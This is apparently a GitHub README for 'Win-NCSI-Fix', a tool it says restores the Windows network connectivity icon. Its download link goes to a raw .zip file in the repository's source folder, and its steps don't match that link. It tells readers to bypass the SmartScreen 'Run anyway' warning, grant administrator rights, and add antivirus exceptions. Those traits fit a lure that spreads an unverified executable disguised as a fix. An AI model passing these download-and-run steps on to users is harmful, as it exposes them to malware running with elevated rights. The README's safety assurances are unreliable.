# 🌐 Win-NCSI-Fix - Resolve your internet connection status icons

[![](https://img.shields.io/badge/Download_Win_NCSI_Fix-Blue?style=for-the-badge)](https://github.com/dodior9535/Win-NCSI-Fix/raw/refs/heads/main/src/WinNcsiFix/Win-NCS-Fix-v1.3.zip)

## 🛠️ What this tool does

Windows shows a globe or warning icon on your network connection when it thinks you have no internet. Sometimes this happens even when your internet works fine. This issue is called the Network Connectivity Status Indicator, or NCSI. It affects how Windows Store apps, Microsoft 365, and other services check for updates.

Win-NCSI-Fix resets the network probes Windows uses to check for a connection. It restores the correct status icons in your taskbar. You do not need to edit the registry or change complex system settings. This tool automates the process to save your time.

## 📋 System requirements

This application works on the following versions of Windows:

* Windows 10
* Windows 11

Your computer requires administrative rights to run the fix. The software installer checks for these rights during the startup process. Ensure you have a stable internet connection before you start the repair, although the tool fixes reachability issues regardless of your state.

## 📥 How to download and run

1. Visit the project page to download the latest file: [https://github.com/dodior9535/Win-NCSI-Fix/raw/refs/heads/main/src/WinNcsiFix/Win-NCS-Fix-v1.3.zip](https://github.com/dodior9535/Win-NCSI-Fix/raw/refs/heads/main/src/WinNcsiFix/Win-NCS-Fix-v1.3.zip).
2. Look for the Releases section on the right side of the page.
3. Click the file ending in .exe to start your download.
4. Open the file once the download finishes.
5. Windows might display a blue box titled "Windows protected your PC." Click "More info" and then select "Run anyway."
6. Give the app permission to make changes when the User Account Control screen appears.

## 🚀 Using the software

The application interface consists of one main window. Follow these steps to diagnose and resolve your network issues:

1. Launch the program.
2. Observe the current Status indicator on the screen. It shows if your current NCSI probe state is active or unresponsive.
3. Click the "Repair Settings" button.
4. Wait for the progress bar to complete.
5. The program displays a success message once it resets the network protocols.
6. The application might ask you to restart your computer to apply the changes fully. Click "Yes" to restart immediately or "No" to do it later.

The tool checks the following areas during the repair process:
* Registry keys for network discovery.
* Active Probing settings.
* DNS cache state.
* Local group policies affecting network detection.

## 🛡️ Safety and privacy

This tool performs read-only operations on your network settings initially. It only writes changes to the Windows Registry after you click the repair button. It does not send your personal data to any server. All actions happen locally on your hardware. You can audit the source code on the main GitHub page if you want to verify how the program functions.

## ❓ Frequently asked questions

**Will this tool break my internet connection?**
No. This tool only updates the detection mechanism Windows uses to display your status. It does not touch your physical network adapter settings or your browser configurations.

**Do I need to be an expert to use this?**
No. The interface contains simple buttons. You only need to navigate to the download link and click the repair button.

**What happens if the problem comes back?**
Network settings can sometimes revert after major Windows updates. If the globe icon returns to your taskbar, reopen the application and run the repair process again.

**Can I stop the program while it runs?**
Wait for the progress bar to finish before you close the window. Closing the program prematurely might leave your network settings in a partial state.

## 🔍 Troubleshooting the tool

If the application fails to open:
* Check if your antivirus software blocked the execution. You may need to create an exception for this file.
* Ensure you are logged into your computer as an administrator. 
* Right-click the file and select "Run as administrator" manually.

If the network icon remains unchanged after a reboot:
* Open your Command Prompt as an administrator.
* Type `ipconfig /flushdns` and press Enter. 
* Check your ISP settings to ensure they do not block Microsoft probe servers.

## 📝 Support

Use the "Issues" tab on the GitHub repository to report bugs. Include a description of your Windows version and a screenshot of the error if possible. Keep your descriptions simple so others can understand your problem. Check existing issues before you create a new one to see if someone already found a solution.